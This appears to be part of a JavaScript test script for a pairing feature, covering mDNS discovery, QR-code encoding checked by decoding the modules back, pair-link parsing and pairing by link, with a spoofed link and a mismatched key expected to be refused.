  const real = announce({ id: "9z9z", port: 7999, fp: "testfp", addresses: (who) => P.mdnsAddresses(who) }, { onError: () => {} });
  const onNet = real ? await browse({ timeout: 1500 }) : [];
  if (real) real.stop();
  if (onNet.some((x) => x.fp === "testfp")) ok("on a real network, a query over multicast finds it", true);
  else console.log("  - skipped: no multicast here (a sandbox, or no network), so the real-network check didn't run");

  console.log("2. THE QR — the link it carries, read back from its modules");
  const Q = await import("../qr.mjs");
  const decode = ({ modules, version }) => {
    const n = modules.length, f = [];
    for (let i = 0; i < 15; i++) f.push(i < 6 ? modules[i][8] : i < 8 ? modules[i + 1][8] : i === 8 ? modules[8][7] : modules[8][14 - i]);
    const fmt = f.reduce((a, b, i) => a | ((b ? 1 : 0) << i), 0) ^ 0x5412, mask = (fmt >> 10) & 7, ec = (fmt >> 13) & 3;
    const { fixed } = Q.frame(version), order = Q.dataOrder(n, fixed), bits = order.map(([r, c]) => (modules[r][c] !== Q.MASKS[mask](r, c) ? 1 : 0));
    const words = []; for (let i = 0; i + 8 <= bits.length; i += 8) words.push(parseInt(bits.slice(i, i + 8).join(""), 2));
    const [, b1, d1, b2, d2] = Q.M_BLOCKS[version], sizes = [...Array(b1).fill(d1), ...Array(b2).fill(d2)], blocks = sizes.map(() => []);
    let k = 0; for (let i = 0; i < Math.max(d1, d2); i++) sizes.forEach((s, b) => { if (i < s) blocks[b].push(words[k++]); });
    const data = blocks.flat(), dbits = data.flatMap((w) => [7, 6, 5, 4, 3, 2, 1, 0].map((i) => (w >> i) & 1)), num = (at, len) => parseInt(dbits.slice(at, at + len).join(""), 2);
    const cb = Q.countBits(version), count = num(4, cb), bytes = []; for (let i = 0; i < count; i++) bytes.push(num(4 + cb + 8 * i, 8));
    return { ec, mode: num(0, 4), text: Buffer.from(bytes).toString("utf8") };
  };
  const texts = [on.link, P.pairLink("123456"), "symbiot://pair?a=192.168.8.50,10.0.0.7&p=7392&c=004211&k=" + on.fp, "é漢字🙂 " + "x".repeat(200)];
  const backs = texts.map((t) => decode(Q.qrMatrix(t)));
  ok("each QR decodes back to its link: level M, byte mode", backs.every((b, i) => b.text === texts[i] && b.ec === 0 && b.mode === 4), backs.map((b) => b.text.slice(0, 40)));
  ok("every mask decodes too", [0, 1, 2, 3, 4, 5, 6, 7].every((m) => decode(Q.qrMatrix(texts[0], { mask: m })).text === texts[0]), "");
  const svg = Q.qrSvg(on.link);
  ok("the SVG has the quiet zone around (4 modules) and scales by its viewBox", /viewBox="0 0 (\d+) \1"/.test(svg) && Number(svg.match(/viewBox="0 0 (\d+)/)[1]) === Q.qrMatrix(on.link).size + 8, svg.slice(0, 120));
  const lanLink = on.link.replace(/a=[^&]*/, "a=192.168.8.50"); // (this test's computer may have no network address of its own)
  const parsed = [P.parsePairLink(lanLink), P.parsePairLink(texts[2]), P.parsePairLink("https://evil.example/pair#a=1.2.3.4&p=1&c=123456&k=x"), P.parsePairLink("symbiot://pair?a=1.2.3.4&c=12")];
  ok("a scanned link: the site's or the app's own form; anything else isn't one", parsed[0] && parsed[0].code === on.code && parsed[0].fp === on.fp && parsed[1].addresses.join() === "192.168.8.50,10.0.0.7" && parsed[1].port === 7392 && !parsed[2] && !parsed[3], parsed);
  const scanned = (await pc.cmd("on"));
  const viaLink = await P.pairComputer("", "", { link: scanned.link.replace(/a=[^&]*/, "a=10.255.255.1,127.0.0.1"), name: "Pixel" });
  ok("pairing by its link tries each address until one answers", viaLink.paired && !viaLink.error, viaLink);
  const code5 = (await pc.cmd("code"));
  const fake5 = await P.pairComputer("", "", { link: code5.link.replace(/a=[^&]*/, "a=127.0.0.1").replace(/k=[\w-]+/, "k=AAAAAAAAAAAAAAAAAAAAAA"), name: "Pixel" });
  ok("a link whose key isn't the computer's: refused, nothing sent", /isn't the one whose code you scanned/.test(fake5.error || ""), fake5.error);
} finally {
  try { await pc.stop(); } catch {}
  rmSync(ROOT, { recursive: true, force: true });
}
console.log(`\n${fail ? "✗" : "✓"} phone: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
